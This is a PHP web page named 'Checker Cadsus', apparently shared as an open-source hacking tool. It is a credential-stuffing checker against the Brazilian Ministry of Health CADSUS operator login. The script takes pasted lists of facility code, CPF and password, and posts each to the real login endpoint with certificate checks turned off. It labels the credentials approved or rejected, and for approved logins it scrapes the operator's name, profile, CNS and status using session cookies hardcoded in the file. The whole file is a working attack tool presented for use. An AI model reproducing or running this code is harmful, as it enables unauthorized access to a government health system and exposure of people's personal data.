<?php
	/*

		OPEN SOURCE POR : INBRAAK SYSTEM
		FORMAS DE CONTATO 
		TWITTER :  @gabriellgomes__
		GITHUB : InbraakSystem
		OBS : NÃO ME RESPONSABILIZO PELOS SEUS ATOS! 
		OBS : ESTE ARQUIVO NÃO ESTA EM Ajax/Jquery então ira testar somente 1 por vez!
	
	*/
?>
<!DOCTYPE html>
<html>
	<head>
		<title>CHECKER CADSUS - INBRAAK SYSTEM</title>
		<meta charset="utf-8">
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
		<style type="text/css">
			div#area{
				text-align: center;
				padding-top: 5px;
			}
			input#btn {
				width: 14%;
			}
			h2{
				color: lime;
				
			}
			div#resultado {
				text-align: center;
			}
			body{
				background-color: #000000;
			}
		</style>
	</head>
	<body>
		<form method="post">
			<div id="area">
				<h2>Checker Cadsus - Inbraak System</h2>
				<br>
				<textarea rows="10" style="width: 75%;" name="cadsus" placeholder="FORMATO : 233412|924.758.150-86|Senha121*"></textarea>
				<br>
				<br>
				<input type="submit" name="btn" id="btn" class="btn btn-success" value="CHECKAR">
				<br>
			</div>
		</post>
		<div id="resultado">
			<?php
				error_reporting(0);
				$cad = $_POST["cadsus"];
				$delim = explode("|", $cad);
				if(!empty($cad)){
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, "https://cadastro.saude.gov.br/operador/loginUsuario.htm");
					curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36");
					curl_setopt($ch, CURLOPT_HTTPHEADER, array(
						'Connection: keep-alive'
					));
					curl_setopt($ch, CURLOPT_REFERER, "https://cadastro.saude.gov.br/operador/");
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
					curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
					curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
					curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
					curl_setopt($ch, CURLOPT_VERBOSE, 1);
					curl_setopt($ch, CURLOPT_POST, 1);
					curl_setopt($ch, CURLOPT_POSTFIELDS, "loginUsuario=".$delim[1]."&loginSenha=".$delim[2]);
					$data = curl_exec($ch);
					$find = "Atualizar";
					$ch = curl_close($ch);

					if(strpos($data, $find)){
						echo "<br>";
						echo "<span style='color: lime;'>CADSUS APROVADA!</span> <br>";
						$ch = curl_init();
						curl_setopt($ch, CURLOPT_URL, "https://cadastro.saude.gov.br/operador/getSistemasUsuarioEstabelecimento.htm?cnes=".$delim[0]);
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36");
						curl_setopt($ch, CURLOPT_COOKIE, "ORA_OTD_JROUTE=wUiPn5KKSXqi-tpA; TS01155e42=01c19909f64eb97df85e6a1eb83c1c98286b24c48c55fbe3d25e64387f95f1022a953beb51480a2842b57e1200d9e669d8f586c114; JSSOperador=6U6XLdPhMo1QpyYlDZ7j1VljtKWRrW7D7mb_mbJrRKNjVzKGnBtH!-1327994601; _ga=GA1.3.545892064.1538179522; _gid=GA1.3.1546189000.1539903932; BIGipServercadastro.saude.gov.br=26978496.20480.0000; TS014aa60d=01c19909f66cd97cf00658481aeef79c682eedc31e8bf3f5ab12d09ddef5a7742701e3bd4fb90131544cf9b336545c8118d4f3793b; _gat_gtag_UA_119008643_1=1");
						curl_setopt($ch, CURLOPT_REFERER, "https://cadastro.saude.gov.br/operador/solicitarRecurso.htm");

						curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
						curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
						curl_setopt($ch, CURLOPT_HTTPHEADER, array(
							'Connection: keep-alive',
							'X-Requested-With: XMLHttpRequest'
						));
						$data = curl_exec($ch);
						$exp = explode('"', $data);
						curl_close($ch);

						echo "<span style='color: lime;'>CNES : ".$delim[0] ."<br>";
						echo "CPF : ".$delim[1] ."<br>";
						echo "SENHA : ".$delim[2] ."<br>";
						echo "Nome : ".$exp[61] ."<br>";
						echo "PERFIL : ".$exp[49] ."<br>";
						echo "CNS : ".$exp[65] ."<br>";
						echo "Status : ".$exp[69] ."<br>";
						echo "Acessar sistema clique <a href='https://cadastro.saude.gov.br/operador/' target='_blank'> Aqui</a>!</span><br>";

						remove_cookies();
					}else{
						echo "<br>";
						echo "<span style='color: red;'>REPROVADA! <br>";
						echo "CNES : ".$delim[0]."<br>";
						echo "CPF : " .$delim[1] ."<br>";
						echo "SENHA : " .$delim[2] ."</span><br>";
					}
				}else{
					echo "";
				}
			?>
		</div>
	</body>
</html>
